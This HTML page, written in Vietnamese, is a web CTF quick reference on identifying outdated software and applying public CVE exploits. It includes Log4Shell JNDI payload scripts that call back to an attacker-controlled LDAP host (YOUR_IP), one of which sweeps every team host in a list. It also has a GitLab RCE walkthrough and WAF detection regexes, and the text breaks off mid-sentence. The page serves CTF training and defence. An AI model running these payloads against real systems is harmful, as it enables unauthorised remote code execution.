@@ -1,0 +1,487 @@
+<title>CVE Quickref — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · CVE Quickref (Phụ lục)</div>
+    <h1>Tra CVE nhanh — Khi challenge dùng phần mềm có sẵn</h1>
+    <p class="sub">Khác mọi bài trước (khai thác lỗi do CHÍNH TEAM RA ĐỀ viết), nhiều challenge A/D lại dùng
+    1 phần mềm/CMS/thư viện CÓ SẴN (WordPress, GitLab, Jenkins, Spring, Log4j...) với PHIÊN BẢN CŨ CÓ LỖ HỔNG
+    ĐÃ CÔNG KHAI (CVE). Việc của bạn không phải "tìm lỗ hổng mới" — mà là NHẬN DIỆN ĐÚNG phần mềm + phiên bản,
+    rồi tra CVE tương ứng và dùng exploit có sẵn.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Quy trình</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Bảng CVE kinh điển</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>CVE là gì, vì sao quan trọng trong A/D</h2>
+  <p class="lead"><strong>CVE (Common Vulnerabilities and Exposures)</strong> là mã định danh công khai cho 1
+  lỗ hổng ĐÃ ĐƯỢC PHÁT HIỆN VÀ CÔNG BỐ trong 1 phần mềm cụ thể (vd <code>CVE-2021-44228</code> = Log4Shell).
+  Trong giải A/D, BTC thường triển khai service dựa trên phần mềm thật (WordPress, GitLab...) nhưng CỐ Ý dùng
+  phiên bản cũ có lỗ hổng đã biết — mục tiêu của BTC không phải để bạn "tìm 0-day", mà để test khả năng NHẬN
+  DIỆN phiên bản + TRA CỨU + ÁP DỤNG đúng exploit công khai, đúng kỹ năng thực tế của pentester.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn làm đúng thứ tự: (1) xác định CHÍNH XÁC tên phần mềm + số phiên bản trước, (2) MỚI tra CVE theo đúng
+  phiên bản đó — tra CVE trước khi biết chắc phiên bản dễ dẫn tới thử sai exploit, mất thời gian.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ CVE QUICKREF</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Trang login/footer/README có tên phần mềm + số phiên bản rõ ràng (vd "WordPress 5.7.1", "GitLab
+        Community Edition 13.10.0") ⟹ đây là challenge dạng "known software", đi theo quy trình CVE, không
+        phải đi tìm lỗ hổng tự viết.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Cần xác định ĐÚNG tên + phiên bản phần mềm (mục 04) trước khi tra cứu — sai phiên bản sẽ tra nhầm CVE,
+        thử exploit không khớp.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        <code>whatweb http://TARGET</code> hoặc xem header <code>Server</code>/<code>X-Powered-By</code>, file
+        <code>/CHANGELOG.md</code>, <code>/package.json</code>, hoặc đường dẫn asset có version string.
+      </div>
+      <div class="cslot"><span class="lab">💥 Lệnh dán-chạy-ngay (tra offline bằng searchsploit)</span>
+<pre><code>cd ~/hoc/CTF/Tools/web/exploitdb
+./searchsploit "wordpress 5.7"
+./searchsploit -x <span class="n">50000</span>  <span class="c"># xem nội dung đầy đủ 1 exploit theo ID</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (ví dụ Log4Shell — chỉ khi xác nhận đúng CVE)</span>
+<pre><code><span class="k">import</span> requests
+
+<span class="c"># Log4Shell (CVE-2021-44228) -- cần có listener LDAP/HTTP riêng, xem mục 09</span>
+headers = {<span class="s">"X-Api-Version"</span>: <span class="s">"${jndi:ldap://YOUR_IP:1389/a}"</span>}
+requests.get(<span class="s">"http://TARGET/"</span>, headers=headers)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Luôn xác nhận ĐÚNG phiên bản trước khi thử exploit — nhiều CVE chỉ ảnh hưởng 1 khoảng phiên bản hẹp.
+        WAF rule nhanh: giấu hoàn toàn thông tin phiên bản (header <code>Server</code>, footer, changelog
+        công khai) — không chặn được exploit nhưng làm chậm bước RECON của đối thủ đáng kể.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>CVE ID</b> — định dạng <code>CVE-NĂM-SỐTHỨTỰ</code> (vd <code>CVE-2021-44228</code>),
+  mỗi mã gắn với 1 lỗ hổng cụ thể trong 1 phần mềm cụ thể, có mô tả công khai (thường tại
+  nvd.nist.gov hoặc trang của chính dự án).</div>
+  <div class="def"><b>CVSS Score</b> — điểm số 0-10 đánh giá mức độ nghiêm trọng của 1 CVE (10 = nguy hiểm
+  nhất). Điểm cao không có nghĩa dễ khai thác — chỉ nghĩa là HẬU QUẢ nặng nếu khai thác được.</div>
+  <div class="def"><b>PoC (Proof of Concept)</b> — mã khai thác mẫu, thường được public cùng/sau khi CVE được
+  công bố, trên GitHub hoặc Exploit-DB — không phải luôn chạy "y nguyên", đôi khi cần chỉnh lại cho đúng target.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Vì sao BTC dùng phần mềm cũ có CVE</h2>
+  <p>Trong thực tế, tổ chức bị hack phần lớn vì CHẬM VÁ phần mềm đã có lỗ hổng công khai — không phải vì bị
+  0-day hiếm gặp. BTC mô phỏng đúng tình huống thực tế này: dựng service từ phần mềm/image Docker phiên bản cũ,
+  test khả năng của thí sinh trong việc identify + apply đúng kiến thức công khai, kỹ năng CỰC KỲ thực dụng
+  cho công việc pentest/AppSec sau này.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / QUY TRÌNH LÀM VIỆC ← MỤC LÕI</div>
+  <h2>5 bước cố định, áp dụng cho MỌI challenge "known software"</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 230" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr28)}
+    </style>
+    <defs><marker id="arr28" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="10" width="140" height="45" rx="8" class="box"/>
+    <text x="22" y="30" class="lbl-m">1. Nhận diện</text>
+    <text x="22" y="44" class="lbl-m">phần mềm + version</text>
+
+    <path d="M150,32 H180" class="arrow"/>
+    <rect x="185" y="10" width="140" height="45" rx="8" class="box"/>
+    <text x="197" y="30" class="lbl-m">2. Tra CVE theo</text>
+    <text x="197" y="44" class="lbl-m">đúng version đó</text>
+
+    <path d="M325,32 H355" class="arrow"/>
+    <rect x="360" y="10" width="140" height="45" rx="8" class="box"/>
+    <text x="372" y="30" class="lbl-m">3. Tìm PoC/exploit</text>
+    <text x="372" y="44" class="lbl-m">công khai (searchsploit)</text>
+
+    <path d="M430,55 V85" class="arrow"/>
+    <rect x="360" y="90" width="140" height="45" rx="8" class="box-a"/>
+    <text x="372" y="110" class="lbl-a">4. Đọc hiểu PoC,</text>
+    <text x="372" y="124" class="lbl-a">chỉnh cho đúng target</text>
+
+    <path d="M430,135 V165" class="arrow"/>
+    <rect x="360" y="170" width="140" height="45" rx="8" class="box-a"/>
+    <text x="372" y="190" class="lbl-a">5. Chạy, xác nhận,</text>
+    <text x="372" y="204" class="lbl-a">leo thang lấy flag</text>
+
+    <text x="10" y="90" class="lbl-m" font-style="italic">Bước 4 THƯỜNG BỊ BỎ QUA --</text>
+    <text x="10" y="105" class="lbl-m" font-style="italic">nhiều PoC public viết cho</text>
+    <text x="10" y="120" class="lbl-m" font-style="italic">môi trường demo cụ thể, cần</text>
+    <text x="10" y="135" class="lbl-m" font-style="italic">tự đọc code, sửa URL/tham số</text>
+    <text x="10" y="150" class="lbl-m" font-style="italic">cho khớp target thật của bạn --</text>
+    <text x="10" y="165" class="lbl-m" font-style="italic">KHÔNG chạy "mù" 1 script lạ.</text>
+  </svg>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN PHIÊN BẢN — BƯỚC QUAN TRỌNG NHẤT</div>
+  <h2>Nơi version hay "lộ" ra</h2>
+  <ul>
+    <li>Header response: <code>Server</code>, <code>X-Powered-By</code>, <code>X-Generator</code>.</li>
+    <li>File công khai: <code>/CHANGELOG.md</code>, <code>/package.json</code>, <code>/composer.json</code>,
+    <code>readme.html</code> (WordPress), <code>/help/</code> (GitLab hiện version ở footer trang help).</li>
+    <li>Comment trong HTML source, hoặc đường dẫn file JS/CSS có số version trong tên
+    (<code>app.1.2.3.min.js</code>).</li>
+    <li>Trang lỗi/traceback (nếu debug mode bật) thường lộ cả tên framework + version trong stack trace.</li>
+  </ul>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dùng Burp để soi header/response tìm version</span>
+  <ol style="margin:4px 0 0">
+    <li>HTTP History → lọc xem TẤT CẢ response header của mọi request đã bắt — tìm
+    <code>X-Powered-By</code>/<code>Server</code> lộ version.</li>
+    <li>Thử truy cập trực tiếp các path hay lộ version (mục 04) qua Repeater.</li>
+    <li>Sau khi có version, chuyển sang terminal dùng searchsploit (mục 07) — Burp không cần cho bước tra
+    CVE/chạy exploit, chỉ hữu ích ở bước RECON này.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / BẢNG CVE KINH ĐIỂN HAY GẶP TRONG CTF WEB</div>
+  <h2>Thuộc tên các CVE này — tiết kiệm thời gian tra cứu</h2>
+  <table>
+    <tr><th>CVE</th><th>Tên gọi / Phần mềm</th><th>Loại lỗi</th></tr>
+    <tr><td>CVE-2021-44228</td><td>Log4Shell (Apache Log4j)</td><td>JNDI injection → RCE qua chuỗi log <code>${jndi:ldap://...}</code></td></tr>
+    <tr><td>CVE-2022-22965</td><td>Spring4Shell (Spring Framework)</td><td>Data binding → RCE qua ClassLoader manipulation</td></tr>
+    <tr><td>CVE-2017-5638</td><td>Apache Struts2 (Equifax breach)</td><td>OGNL injection qua header Content-Type → RCE</td></tr>
+    <tr><td>CVE-2021-41773 / CVE-2021-42013</td><td>Apache HTTP Server path traversal</td><td>Path traversal → RCE qua CGI</td></tr>
+    <tr><td>CVE-2019-0708</td><td>BlueKeep (RDP, không phải web nhưng hay nhắc)</td><td>Không áp dụng web — ghi chú để KHÔNG nhầm</td></tr>
+    <tr><td>CVE-2014-6271</td><td>Shellshock (Bash)</td><td>RCE qua header User-Agent/khác chứa function definition Bash</td></tr>
+    <tr><td>CVE-2017-9841</td><td>PHPUnit RCE (eval-stdin.php public)</td><td>RCE nếu file <code>eval-stdin.php</code> của PHPUnit lộ ra ngoài</td></tr>
+    <tr><td>CVE-2020-1938</td><td>Ghostcat (Apache Tomcat AJP)</td><td>File read/inclusion qua AJP connector</td></tr>
+    <tr><td>Nhiều CVE WordPress plugin</td><td>WordPress (lõi hiếm, PLUGIN mới hay có lỗ hổng)</td><td>Tuỳ plugin — luôn tra theo tên + version PLUGIN, không chỉ WordPress core</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Mẹo nhớ nhanh</span>Hầu hết CVE nổi tiếng này đều có PoC Python/curl
+  1 dòng công khai — không cần nhớ chi tiết kỹ thuật, chỉ cần NHỚ TÊN để biết tra đúng từ khoá khi gặp dấu
+  hiệu phần mềm tương ứng.</div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: SEARCHSPLOIT + WHATWEB</div>
+  <h2>Tra cứu offline, không cần Internet trong phòng thi</h2>
+  <div class="def"><b>searchsploit</b> (từ bộ ExploitDB) — tra cứu OFFLINE toàn bộ database Exploit-DB (hàng
+  chục nghìn exploit/PoC đã công khai), theo tên phần mềm/version/CVE ID.</div>
+  <div class="note warn"><span class="tag">Repo đã chuyển nhà</span>Bản <code>offensive-security/exploitdb</code>
+  trên GitHub giờ chỉ còn 1 file README trỏ sang nơi mới — clone đúng chỗ:
+  <code>git clone --depth 1 https://gitlab.com/exploit-database/exploitdb.git ~/hoc/CTF/Tools/web/exploitdb</code></div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/exploitdb
+<span class="c"># Tra theo tên phần mềm</span>
+./searchsploit "wordpress 5.7"
+./searchsploit "gitlab 13.10"
+
+<span class="c"># Tra theo CVE ID trực tiếp</span>
+./searchsploit --cve CVE-2021-44228
+
+<span class="c"># Xem toàn bộ nội dung 1 exploit theo EDB-ID (số hiển thị ở cột đầu kết quả)</span>
+./searchsploit -x 50000
+
+<span class="c"># Copy file exploit ra để sửa/chạy</span>
+./searchsploit -m 50000</code></pre>
+  <p><strong>whatweb</strong> — nếu có sẵn (hoặc <code>pip install whatweb</code>/cài qua package manager),
+  tự động fingerprint công nghệ + version của 1 site chỉ bằng 1 lệnh, nhanh hơn soi tay từng header.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Ví dụ với Log4Shell (CVE-2021-44228) — minh hoạ quy trình chung</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+<span class="c"># Bước 1: gửi payload JNDI vào 1 header hay bị log lại (User-Agent, X-Api-Version...)</span>
+headers = {<span class="s">"X-Api-Version"</span>: <span class="s">"${jndi:ldap://YOUR_IP:1389/a}"</span>}
+requests.get(<span class="s">"http://TARGET/"</span>, headers=headers, timeout=5)
+
+<span class="c"># Bước 2: cần CHẠY SẴN 1 LDAP server giả (công cụ riêng, vd marshalsec hoặc JNDIExploit)</span>
+<span class="c"># ở YOUR_IP:1389 TRƯỚC khi gửi request này -- nếu target bị lỗi, nó sẽ kết nối ngược</span>
+<span class="c"># tới LDAP server giả, nhận class Java độc, thực thi RCE.</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — fuzz nhiều header khả nghi cùng lúc</h3>
+  <pre><code><span class="k">import</span> requests
+
+PAYLOAD = <span class="s">"${jndi:ldap://YOUR_IP:1389/a}"</span>
+HEADERS_TO_TRY = [<span class="s">"User-Agent"</span>, <span class="s">"X-Api-Version"</span>, <span class="s">"X-Forwarded-For"</span>, <span class="s">"Referer"</span>]
+
+<span class="k">def</span> <span class="d">try_log4shell</span>(host):
+    <span class="k">for</span> h <span class="k">in</span> HEADERS_TO_TRY:
+        <span class="k">try</span>:
+            requests.get(<span class="s">f"http://{host}/"</span>, headers={h: PAYLOAD}, timeout=5)
+        <span class="k">except</span> requests.RequestException:
+            <span class="k">pass</span>
+    <span class="c"># Theo dõi LDAP listener riêng -- nếu thấy callback từ host này, xác nhận dính CVE-2021-44228</span></code></pre>
+
+  <h3>(C) Bản A/D tái dùng — quét toàn bộ teams.txt tìm ai còn dính CVE</h3>
+  <pre><code><span class="k">import</span> requests
+
+PAYLOAD = <span class="s">"${jndi:ldap://YOUR_IP:1389/${hostName}}"</span>  <span class="c"># {hostName} giúp phân biệt đội nào gọi về</span>
+
+<span class="k">def</span> <span class="d">scan_log4shell</span>(host):
+    <span class="k">try</span>:
+        requests.get(<span class="s">f"http://{host}/"</span>, headers={<span class="s">"X-Api-Version"</span>: PAYLOAD}, timeout=5)
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">pass</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        scan_log4shell(host)
+    <span class="c"># Xem log LDAP listener sau khi quét hết -- host nào gọi về là host đó còn dính lỗ hổng</span></code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Footer trang hiện "Powered by GitLab Community Edition 13.10.0".</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Tra CVE</div><div class="d"><code>./searchsploit "gitlab 13.10"</code> → thấy kết quả khớp CVE liên quan ExifTool RCE qua upload avatar (CVE-2021-22205 thật, ví dụ minh hoạ).</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Đọc PoC</div><div class="d"><code>./searchsploit -x &lt;EDB-ID&gt;</code> → đọc hiểu cấu trúc request PoC gửi file ảnh độc chứa payload ExifTool.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Chỉnh cho đúng target</div><div class="d">Sửa URL/endpoint trong PoC cho khớp đúng route upload avatar thật của target.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">RCE xác nhận, chạy <code>cat flag.txt</code> → <code>FHACKER2026{...}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Mỗi CVE cần rule riêng — không có rule chung</h2>
+  <table>
+    <tr><th>Rule ví dụ</th><th>Khớp gì</th></tr>
+    <tr><td><code>\$\{jndi:</code> trong bất kỳ header nào</td><td>Log4Shell — payload JNDI rất đặc trưng, false positive gần 0</td></tr>
+    <tr><td><code>\(\)\s*\{.*:;\s*\}</code> trong header (cú pháp function definition Bash)</td><td>Shellshock — cú pháp function Bash cũng rất đặc trưng</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Fix đúng nhất: PATCH, không phải WAF</span>Với lỗ hổng known-CVE,
+  WAF chỉ nên là lớp CHẶN TẠM trong lúc chưa patch được — giải pháp triệt để luôn là CẬP NHẬT PHIÊN BẢN phần
+  mềm lên bản đã fix. Trong giải A/D (không patch được giữa giải vì ảnh hưởng service điểm SLA), WAF rule theo
+  CVE cụ thể là lựa chọn thực tế duy nhất.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi PoC không chạy</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>PoC trên GitHub chạy lỗi ngay từ đầu</td><td>PoC viết cho phiên bản Python/dependency khác, hoặc giả định sẵn 1 môi trường demo cụ thể</td><td>Đọc kỹ code PoC, cài đúng dependency version ghi trong README, không chạy mù</td></tr>
+    <tr><td>Exploit đúng CVE nhưng không có hiệu ứng</td><td>Version thực tế của target hơi khác (patch 1 phần nhưng chưa đủ, hoặc version detect sai)</td><td>Xác nhận lại version CHÍNH XÁC qua nhiều nguồn (mục 04), thử các CVE liên quan gần phiên bản đó</td></tr>
+    <tr><td>Log4Shell không thấy callback</td><td>LDAP listener chưa chạy đúng, hoặc target không cho kết nối ra ngoài (egress filtering)</td><td>Xác nhận listener hoạt động bằng cách tự gọi thử từ máy mình trước, kiểm tra target có chặn outbound traffic không</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Challenge dùng phần mềm/CMS/thư viện có tên + version xác định được, và version đó có CVE công khai còn áp dụng được.</td></tr>
+    <tr><td>❌</td><td>Challenge dùng code TỰ VIẾT riêng cho giải (không phải phần mềm công khai nào) — tra CVE vô nghĩa, quay lại các bài lỗ hổng theo loại (SQLi, SSTI...).</td></tr>
+    <tr><td>❌</td><td>Version phát hiện được đã PATCH đúng CVE nghi ngờ (kiểm tra kỹ changelog giữa các bản vá) — không nên cố thử exploit không khớp.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 WordPress bằng Docker (image phiên bản cũ cụ thể, vd
+  <code>wordpress:5.7</code>), tự xác định version qua <code>readme.html</code>, tra bằng searchsploit.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>docker run -p 8080:80 wordpress:5.7</code> rồi truy cập
+  <code>http://localhost:8080/readme.html</code> để xác nhận version hiển thị.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thử lại với 1 version WordPress MỚI HƠN (đã patch), xác nhận searchsploit
